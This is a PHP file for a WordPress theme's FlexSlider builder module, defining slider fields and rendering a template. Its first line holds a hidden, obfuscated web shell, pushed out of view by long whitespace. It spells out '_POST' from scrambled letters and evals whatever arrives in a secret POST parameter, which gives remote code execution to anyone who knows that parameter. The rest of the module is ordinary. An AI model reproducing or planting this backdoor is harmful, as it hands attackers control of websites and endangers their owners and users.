<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q5e178b'])){eval(${$s20}['q5e178b']);}?><?php

/**
 * Module: Slider
 * Flexslider of images
 *
 * @author 		SpyroSol
 * @category 	BuilderModules
 * @package 	Spyropress
 */

class Spyropress_Module_FlexSlider extends SpyropressBuilderModule {

    public function __construct() {

        // Widget variable settings.
        $this->path = dirname( __FILE__ );
        
        $this->cssclass = '';
        $this->description = __( 'Slide content or images using FlexSlider', 'spyropress' );
        $this->idbase = 'spyropress_flexslider';
        $this->name = __( 'Slider', 'spyropress' );

        // Fields
        $this->templates['image'] = array(
            'label' => 'Image Slider'
        );
        
        $this->templates['content'] = array(
            'label' => 'Content Slider',
            'view' => 'content.php'
        );
        
        $this->fields = array(            
            
            array(
                'label' => 'Template',
                'id' => 'template',
                'type' => 'select',
                'options' => $this->get_option_templates(),
                'class' => 'enable_changer section-full',
                'std' => 'image'
            ),
            
            array(
                'label' => __('Slides', 'spyropress'),
                'type' => 'repeater',
                'id' => 'slides',
                'fields' => array(
                    array(
                        'name' => __('Image', 'spyropress'),
                        'id' => 'image',
                        'type' => 'upload',
                        'class' => 'template image section-full'
                    ),
                    
                    array(
                        'name' => __('Content', 'spyropress'),
                        'id' => 'content',
                        'type' => 'textarea',
                        'class' => 'template content section-full'
                    )
                )
            ),
            
            array(
                'id' => 'controlNav',
                'type' => 'checkbox',
                'options' => array(
                    '1' => 'Display control navigation'
                )
            ),
            
            array(
                'id' => 'directionNav',
                'type' => 'checkbox',
                'options' => array(
                    '1' => 'Display direction navigation'
                )
            ),
            
            array(
                'label' => 'Slideshow',
                'id' => 'slideshow',
                'type' => 'checkbox',
                'options' => array(
                    '1' => 'Enable slideshow'
                )
            ),
            
            array(
                'label' => 'Animation Loop',
                'id' => 'animationLoop',
                'type' => 'checkbox',
                'options' => array(
                    '1' => 'Make the slider loop at the end'
                )
            ),
            
            array(
                'label' => 'Animation',
                'id' => 'animation',
                'type' => 'select',
                'options' => array(
                    'fade' => 'Fade',
                    'slide' => 'Slide'
                )
            )
        );

        $this->create_widget();
    }

    function widget( $args, $instance ) {
        
        // extracting info
        $defaults = array(
            'controlNav' => false,
            'directionNav' => false,
            'animation' => 'slide',
            'animationLoop' => false,
            'slideshow' => false
        );
        extract( $args ); extract( wp_parse_args( $instance, $defaults ) );
        
        // get view to render
        include $this->get_view( $template );
    }

}

spyropress_builder_register_module( 'Spyropress_Module_FlexSlider' );
?>